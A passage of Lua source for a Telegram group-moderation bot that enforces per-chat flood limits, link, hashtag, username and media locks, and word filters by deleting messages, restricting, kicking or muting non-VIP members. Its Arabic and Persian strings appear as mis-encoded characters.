database:set(bot_id..'Tshake:Msg:Pin:Chat'..v,photo) 
end 
elseif msg.content_.animation_ then
for k,v in pairs(list) do 
sendDocument(v, 0, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or "")) 
database:set(bot_id..'Tshake:Msg:Pin:Chat'..v,msg.content_.animation_.animation_.persistent_id_)
end 
elseif msg.content_.sticker_ then
for k,v in pairs(list) do 
sendSticker(v, 0, msg.content_.sticker_.sticker_.persistent_id_)   
database:set(bot_id..'Tshake:Msg:Pin:Chat'..v,msg.content_.sticker_.sticker_.persistent_id_) 
end 
end
send(msg.chat_id_, msg.id_,"π βΏΨͺΩΨͺ Ψ§ΩΨ§Ψ°Ψ§ΨΉΩ Ψ§ΩΩ *~ "..#list.." ~* ΩΨ¬ΩΩΨΉΩ ")     
database:del(bot_id.."Tshake:Tshake:Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end


if not Vips(msg) and msg.content_.ID ~= "MessageChatAddMembers" and database:hget(bot_id.."Tshake:flooding:settings:"..msg.chat_id_,"flood") then 
floods = database:hget(bot_id.."Tshake:flooding:settings:"..msg.chat_id_,"flood") or "nil"
Num_Msg_Max = database:hget(bot_id.."Tshake:flooding:settings:"..msg.chat_id_,"floodmax") or 5
Time_Spam = database:hget(bot_id.."Tshake:flooding:settings:"..msg.chat_id_,"floodtime") or 5
local post_count = tonumber(database:get(bot_id.."Tshake:floodc:"..msg.sender_user_id_..":"..msg.chat_id_) or 0)
if post_count > tonumber(database:hget(bot_id.."Tshake:flooding:settings:"..msg.chat_id_,"floodmax") or 5) then 
local ch = msg.chat_id_
local type = database:hget(bot_id.."Tshake:flooding:settings:"..msg.chat_id_,"flood") 
Is_Not_Spam(msg,type)  
end
database:setex(bot_id.."Tshake:floodc:"..msg.sender_user_id_..":"..msg.chat_id_, tonumber(database:hget(bot_id.."Tshake:flooding:settings:"..msg.chat_id_,"floodtime") or 3), post_count+1) 
local edit_id = data.text_ or "nil"  
Num_Msg_Max = 5
if database:hget(bot_id.."Tshake:flooding:settings:"..msg.chat_id_,"floodmax") then
Num_Msg_Max = database:hget(bot_id.."Tshake:flooding:settings:"..msg.chat_id_,"floodmax") 
end
if database:hget(bot_id.."Tshake:flooding:settings:"..msg.chat_id_,"floodtime") then
Time_Spam = database:hget(bot_id.."Tshake:flooding:settings:"..msg.chat_id_,"floodtime") 
end 
end 
--------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------
if database:get(bot_id.."Tshake:Lock:text"..msg.chat_id_) and not Vips(msg) then       
DeleteMessage(msg.chat_id_,{[0] = msg.id_})   
return false     
end     
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageChatAddMembers" then 
database:incr(bot_id.."Tshake:Add:Memp"..msg.chat_id_..":"..msg.sender_user_id_) 
end
if msg.content_.ID == "MessageChatAddMembers" and not Vips(msg) then   
if database:get(bot_id.."Tshake:Lock:AddMempar"..msg.chat_id_) == "kick" then
local mem_id = msg.content_.members_  
for i=0,#mem_id do  
Kick_Group(msg.chat_id_,mem_id[i].id_)
end
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageChatJoinByLink" and not Vips(msg) then 
if database:get(bot_id.."Tshake:Lock:Join"..msg.chat_id_) == "kick" then
Kick_Group(msg.chat_id_,msg.sender_user_id_)
return false  
end
end
if text and database:get(bot_id..'lock:Fshar'..msg.chat_id_) and not Addictive(msg) then 
list = {"ΩΨ³","ΩΨ³ΩΩ","ΩΨ³Ψ?ΨͺΩ","ΨΉΩΨ±","ΩΨ³Ψ?Ψ§ΩΨͺΩ","Ψ?Ψ±Ψ§ Ψ¨Ψ§ΩΩΩ","ΨΉΩΨ± Ψ¨Ψ§ΩΩΩ","ΩΨ³Ψ?ΩΨ§ΨͺΩΩ","ΩΨ­Ψ§Ψ¨","ΩΩΨ§ΩΩΨ¬","ΩΩΨ§ΩΩΨ¬","ΩΨ­Ψ¨Ω","Ψ§Ψ¨Ω Ψ§ΩΩΨ­Ψ¨Ω","ΩΨ±Ψ?","ΩΨ±ΩΨ?","Ψ·ΩΨ²Ω","Ψ·ΩΨ²Ψ?ΨͺΩ"}
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
end
end
end
if text and database:get(bot_id..'lock:Fars'..msg.chat_id_) and not Addictive(msg) then 
list = {"Ϊ©Ω","ΩΎΫ","Ψ?Ψ³ΨͺΩ","Ψ¨Ψ±Ω","Ψ±Ψ§Ψ­ΨͺΫ","Ψ¨ΫΨ§Ω","Ψ¨ΩΎΩΨ΄Ω","ΩΨ±ΩΩ","ΪΩ","Ϊ¬","ΪΏ","Ϊ","Ϊ","Ϊ","Ϊ","έ","ΪΈ","ΩΎ","Ϋ΄","Ψ²Ψ―Ω","Ψ―Ψ?ΨͺΨ±Ψ§","Ψ―ΫΩΨ«","ΩΪ©","Ψ²Ψ―Ω"}
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
end
end
end
if msg.content_.ID == 'MessageSticker' and not Owner(msg) then 
local filter = database:smembers(bot_id.."filtersteckr"..msg.chat_id_)
for k,v in pairs(filter) do
if v == msg.content_.sticker_.set_id_ then
Reply_Status(msg,msg.sender_user_id_,"reply","πβΏ ΨͺΩ ΩΩΨΉ Ψ§ΩΩΩΨ΅Ω ΩΩΨ§")  
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false   
end
end
end
------------------------------------------------------------------------
if msg.content_.ID == 'MessagePhoto' and not Owner(msg) then 
local filter = database:smembers(bot_id.."filterphoto"..msg.chat_id_)
for k,v in pairs(filter) do
if v == msg.content_.photo_.id_ then
Reply_Status(msg,msg.sender_user_id_,"reply","πβΏ ΨͺΩ ΩΩΨΉ Ψ§ΩΨ΅ΩΨ±Ω ΩΩΨ§")  
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false   
end
end
end
------------------------------------------------------------------------
if msg.content_.ID == 'MessageAnimation' and not Owner(msg) then 
local filter = database:smembers(bot_id.."filteranimation"..msg.chat_id_)
for k,v in pairs(filter) do
if v == msg.content_.animation_.animation_.persistent_id_ then
Reply_Status(msg,msg.sender_user_id_,"reply","πβΏ ΨͺΩ ΩΩΨΉ Ψ§ΩΩΨͺΨ­Ψ±ΩΩ ΩΩΨ§")  
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false   
end
end
end

--------------------------------------------------------------------------------------------------------------
if msg.content_.caption_ then 
if msg.content_.caption_:match("@[%a%d_]+") or msg.content_.caption_:match("@(.+)") then  
if database:get(bot_id.."Tshake:Lock:User:Name"..msg.chat_id_) == "del" and not Vips(msg) then    
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Tshake:Lock:User:Name"..msg.chat_id_) == "ked" and not Vips(msg) then    
RestrictChat(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Tshake:Lock:User:Name"..msg.chat_id_) == "kick" and not Vips(msg) then    
Kick_Group(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Tshake:Lock:User:Name"..msg.chat_id_) == "ktm" and not Vips(msg) then    
database:sadd(bot_id.."Tshake:Muted:User"..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
end
--------------------------------------------------------------------------------------------------------------
if text and text:match("@[%a%d_]+") or text and text:match("@(.+)") then    
if database:get(bot_id.."Tshake:Lock:User:Name"..msg.chat_id_) == "del" and not Vips(msg) then    
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Tshake:Lock:User:Name"..msg.chat_id_) == "ked" and not Vips(msg) then    
RestrictChat(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Tshake:Lock:User:Name"..msg.chat_id_) == "kick" and not Vips(msg) then    
Kick_Group(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Tshake:Lock:User:Name"..msg.chat_id_) == "ktm" and not Vips(msg) then    
database:sadd(bot_id.."Tshake:Muted:User"..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.caption_ then 
if msg.content_.caption_:match("#[%a%d_]+") or msg.content_.caption_:match("#(.+)") then 
if database:get(bot_id.."Tshake:Lock:hashtak"..msg.chat_id_) == "del" and not Vips(msg) then    
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Tshake:Lock:hashtak"..msg.chat_id_) == "ked" and not Vips(msg) then    
RestrictChat(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Tshake:Lock:hashtak"..msg.chat_id_) == "kick" and not Vips(msg) then    
Kick_Group(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Tshake:Lock:hashtak"..msg.chat_id_) == "ktm" and not Vips(msg) then    
database:sadd(bot_id.."Tshake:Muted:User"..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
end
--------------------------------------------------------------------------------------------------------------
if text and text:match("#[%a%d_]+") or text and text:match("#(.+)") then
if database:get(bot_id.."Tshake:Lock:hashtak"..msg.chat_id_) == "del" and not Vips(msg) then    
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Tshake:Lock:hashtak"..msg.chat_id_) == "ked" and not Vips(msg) then    
RestrictChat(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Tshake:Lock:hashtak"..msg.chat_id_) == "kick" and not Vips(msg) then    
Kick_Group(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Tshake:Lock:hashtak"..msg.chat_id_) == "ktm" and not Vips(msg) then    
database:sadd(bot_id.."Tshake:Muted:User"..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.caption_ then 
if msg.content_.caption_:match("/[%a%d_]+") or msg.content_.caption_:match("/(.+)") then  
if database:get(bot_id.."Tshake:Lock:Cmd"..msg.chat_id_) == "del" and not Vips(msg) then    
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Tshake:Lock:Cmd"..msg.chat_id_) == "ked" and not Vips(msg) then    
RestrictChat(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Tshake:Lock:Cmd"..msg.chat_id_) == "kick" and not Vips(msg) then    
Kick_Group(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Tshake:Lock:Cmd"..msg.chat_id_) == "ktm" and not Vips(msg) then    
database:sadd(bot_id.."Tshake:Muted:User"..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
end
--------------------------------------------------------------------------------------------------------------
if text and text:match("/[%a%d_]+") or text and text:match("/(.+)") then
if database:get(bot_id.."Tshake:Lock:Cmd"..msg.chat_id_) == "del" and not Vips(msg) then    
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Tshake:Lock:Cmd"..msg.chat_id_) == "ked" and not Vips(msg) then    
RestrictChat(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Tshake:Lock:Cmd"..msg.chat_id_) == "kick" and not Vips(msg) then    
Kick_Group(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Tshake:Lock:Cmd"..msg.chat_id_) == "ktm" and not Vips(msg) then    
database:sadd(bot_id.."Tshake:Muted:User"..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.caption_ then 
if not Vips(msg) then 
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]/") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]/") or msg.content_.caption_:match(".[Pp][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]/") or msg.content_.caption_:match("[Jj][Oo][Ii][Nn][Cc][Hh][Aa][Tt]/") or msg.content_.caption_:match("[Tt].[Mm][Ee]/") then 
if database:get(bot_id.."Tshake:Lock:Link"..msg.chat_id_) == "del" and not Vips(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Tshake:Lock:Link"..msg.chat_id_) == "ked" and not Vips(msg) then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Tshake:Lock:Link"..msg.chat_id_) == "kick" and not Vips(msg) then
Kick_Group(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Tshake:Lock:Link"..msg.chat_id_) == "ktm" and not Vips(msg) then
database:sadd(bot_id.."Tshake:Muted:User"..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
end
end
--------------------------------------------------------------------------------------------------------------
if text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]/") or text and text:match("[Hh][Tt][Tt][Pp][Ss]://") or text and text:match("[Hh][Tt][Tt][Pp]://") or text and text:match("[Ww][Ww][Ww].") or text and text:match(".[Cc][Oo][Mm]") or text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]/") or text and text:match(".[Pp][Ee]") or text and text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]/") or text and text:match("[Jj][Oo][Ii][Nn][Cc][Hh][Aa][Tt]/") or text and text:match("[Tt].[Mm][Ee]/") and not Vips(msg) then
if database:get(bot_id.."Tshake:Lock:Link"..msg.chat_id_) == "del" and not Vips(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Tshake:Lock:Link"..msg.chat_id_) == "ked" and not Vips(msg) then 
RestrictChat(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Tshake:Lock:Link"..msg.chat_id_) == "kick" and not Vips(msg) then
Kick_Group(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Tshake:Lock:Link"..msg.chat_id_) == "ktm" and not Vips(msg) then
database:sadd(bot_id.."Tshake:Muted:User"..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessagePhoto" and not Vips(msg) then     
if database:get(bot_id.."Tshake:Lock:Photo"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Tshake:Lock:Photo"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Tshake:Lock:Photo"..msg.chat_id_) == "kick" then
Kick_Group(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Tshake:Lock:Photo"..msg.chat_id_) == "ktm" then
database:sadd(bot_id.."Tshake:Muted:User"..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageVideo" and not Vips(msg) then     
if database:get(bot_id.."Tshake:Lock:Video"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Tshake:Lock:Video"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Tshake:Lock:Video"..msg.chat_id_) == "kick" then
Kick_Group(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Tshake:Lock:Video"..msg.chat_id_) == "ktm" then
database:sadd(bot_id.."Tshake:Muted:User"..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageAnimation" and not Vips(msg) then     
if database:get(bot_id.."Tshake:Lock:Animation"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Tshake:Lock:Animation"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Tshake:Lock:Animation"..msg.chat_id_) == "kick" then
Kick_Group(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Tshake:Lock:Animation"..msg.chat_id_) == "ktm" then
database:sadd(bot_id.."Tshake:Muted:User"..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.game_ and not Vips(msg) then     
if database:get(bot_id.."Tshake:Lock:geam"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Tshake:Lock:geam"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Tshake:Lock:geam"..msg.chat_id_) == "kick" then
Kick_Group(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Tshake:Lock:geam"..msg.chat_id_) == "ktm" then
database:sadd(bot_id.."Tshake:Muted:User"..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageAudio" and not Vips(msg) then     
if database:get(bot_id.."Tshake:Lock:Audio"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Tshake:Lock:Audio"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Tshake:Lock:Audio"..msg.chat_id_) == "kick" then
Kick_Group(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Tshake:Lock:Audio"..msg.chat_id_) == "ktm" then
database:sadd(bot_id.."Tshake:Muted:User"..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageVoice" and not Vips(msg) then     
if database:get(bot_id.."Tshake:Lock:vico"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Tshake:Lock:vico"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Tshake:Lock:vico"..msg.chat_id_) == "kick" then
Kick_Group(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Tshake:Lock:vico"..msg.chat_id_) == "ktm" then
database:sadd(bot_id.."Tshake:Muted:User"..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.reply_markup_ and msg.reply_markup_.ID == "ReplyMarkupInlineKeyboard" and not Vips(msg) then     
if database:get(bot_id.."Tshake:Lock:Keyboard"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Tshake:Lock:Keyboard"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Tshake:Lock:Keyboard"..msg.chat_id_) == "kick" then
Kick_Group(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Tshake:Lock:Keyboard"..msg.chat_id_) == "ktm" then
database:sadd(bot_id.."Tshake:Muted:User"..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageSticker" and not Vips(msg) then     
if database:get(bot_id.."Tshake:Lock:Sticker"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Tshake:Lock:Sticker"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Tshake:Lock:Sticker"..msg.chat_id_) == "kick" then
Kick_Group(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Tshake:Lock:Sticker"..msg.chat_id_) == "ktm" then
database:sadd(bot_id.."Tshake:Muted:User"..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.forward_info_ and not Vips(msg) then     
if database:get(bot_id.."Tshake:Lock:forward"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
elseif database:get(bot_id.."Tshake:Lock:forward"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
elseif database:get(bot_id.."Tshake:Lock:forward"..msg.chat_id_) == "kick" then
Kick_Group(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
elseif database:get(bot_id.."Tshake:Lock:forward"..msg.chat_id_) == "ktm" then
database:sadd(bot_id.."Tshake:Muted:User"..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageDocument" and not Vips(msg) then     
if database:get(bot_id.."Tshake:Lock:Document"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Tshake:Lock:Document"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Tshake:Lock:Document"..msg.chat_id_) == "kick" then
Kick_Group(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Tshake:Lock:Document"..msg.chat_id_) == "ktm" then
database:sadd(bot_id.."Tshake:Muted:User"..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageUnsupported" and not Vips(msg) then      
if database:get(bot_id.."Tshake:Lock:Unsupported"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Tshake:Lock:Unsupported"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Tshake:Lock:Unsupported"..msg.chat_id_) == "kick" then
Kick_Group(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Tshake:Lock:Unsupported"..msg.chat_id_) == "ktm" then
database:sadd(bot_id.."Tshake:Muted:User"..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.entities_ then 
if msg.content_.entities_[0] then 
if msg.content_.entities_[0].ID == "MessageEntityUrl" or msg.content_.entities_[0].ID == "MessageEntityTextUrl" then      
if not Vips(msg) then
if database:get(bot_id.."Tshake:Lock:Markdaun"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Tshake:Lock:Markdaun"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Tshake:Lock:Markdaun"..msg.chat_id_) == "kick" then
Kick_Group(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Tshake:Lock:Markdaun"..msg.chat_id_) == "ktm" then
database:sadd(bot_id.."Tshake:Muted:User"..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end  
end 
end
end 

if tonumber(msg.via_bot_user_id_) ~= 0 and not Vips(msg) then
if database:get(bot_id.."Tshake:Lock:Inlen"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Tshake:Lock:Inlen"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Tshake:Lock:Inlen"..msg.chat_id_) == "kick" then
Kick_Group(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Tshake:Lock:Inlen"..msg.chat_id_) == "ktm" then
database:sadd(bot_id.."Tshake:Muted:User"..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end 


--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageContact" and not Vips(msg) then      
if database:get(bot_id.."Tshake:Lock:Contact"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Tshake:Lock:Contact"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Tshake:Lock:Contact"..msg.chat_id_) == "kick" then
Kick_Group(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Tshake:Lock:Contact"..msg.chat_id_) == "ktm" then
database:sadd(bot_id.."Tshake:Muted:User"..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.text_ and not Vips(msg) then  
local _nl, ctrl_ = string.gsub(text, "%c", "")  
local _nl, real_ = string.gsub(text, "%d", "")   
sens = 400  
if database:get(bot_id.."Tshake:Lock:Spam"..msg.chat_id_) == "del" and string.len(msg.content_.text_) > (sens) or ctrl_ > (sens) or real_ > (sens) then 
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Tshake:Lock:Spam"..msg.chat_id_) == "ked" and string.len(msg.content_.text_) > (sens) or ctrl_ > (sens) or real_ > (sens) then 
RestrictChat(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Tshake:Lock:Spam"..msg.chat_id_) == "kick" and string.len(msg.content_.text_) > (sens) or ctrl_ > (sens) or real_ > (sens) then 
Kick_Group(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Tshake:Lock:Spam"..msg.chat_id_) == "ktm" and string.len(msg.content_.text_) > (sens) or ctrl_ > (sens) or real_ > (sens) then 
